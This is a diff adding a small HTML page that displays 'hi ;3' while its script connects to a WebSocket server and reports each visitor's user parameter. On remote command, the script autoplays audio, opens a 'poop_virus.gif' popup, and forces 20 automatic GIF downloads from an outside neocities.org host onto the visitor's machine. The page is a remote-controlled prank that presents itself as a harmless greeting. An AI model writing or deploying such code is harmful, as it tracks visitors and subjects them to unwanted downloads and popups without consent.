@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>hi</title>
+<style>
+body{background:#000;color:#ff69b4;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0;font-family:sans-serif;overflow:hidden}
+h1{font-size:20vw;margin:0}
+</style>
+</head>
+<body>
+<h1>hi ;3</h1>
+<audio id="m" src="/Music.mp3" preload="auto"></audio>
+<script>
+const m = document.getElementById('m')
+const ws = new WebSocket('wss://' + location.host)
+
+ws.onopen = () => {
+  const p = new URLSearchParams(location.search)
+  const u = p.get('user') || 'Someone'
+  fetch(`/notify?user=${encodeURIComponent(u)}`)
+}
+
+ws.onmessage = (e) => {
+  const d = JSON.parse(e.data)
+
+  if (d.action === 'play') {
+    m.play().catch(()=>{})
+  }
+
+  if (d.action === 'skull') {
+    window.open('https://wilders.neocities.org/poop_virus.gif', '_blank')
+  }
+
+  if (d.action === 'download') {
+    const gifs = [
+      'https://wilders.neocities.org/poop_virus.gif',
+      'https://wilders.neocities.org/caption.gif'
+    ]
+    for(let i = 0; i < 20; i++){
+      let a = document.createElement('a')
+      a.href = gifs[i % gifs.length] + '?t=' + Date.now() + i
+      a.download = 'f' + (i + 1) + '.gif'
+      document.body.appendChild(a)
+      a.click()
+      a.remove()
+    }
+  }
+
+  if (d.action === 'all') {
+    m.play().catch(()=>{})
+    window.open('https://wilders.neocities.org/poop_virus.gif', '_blank')
+    const gifs = [
+      'https://wilders.neocities.org/poop_virus.gif',
+      'https://wilders.neocities.org/caption.gif'
+    ]
+    for(let i = 0; i < 20; i++){
+      let a = document.createElement('a')
+      a.href = gifs[i % gifs.length] + '?t=' + Date.now() + i
+      a.download = 'f' + (i + 1) + '.gif'
+      document.body.appendChild(a)
+      a.click()
+      a.remove()
+    }
+  }
+}
+</script>
+</body>
+</html>
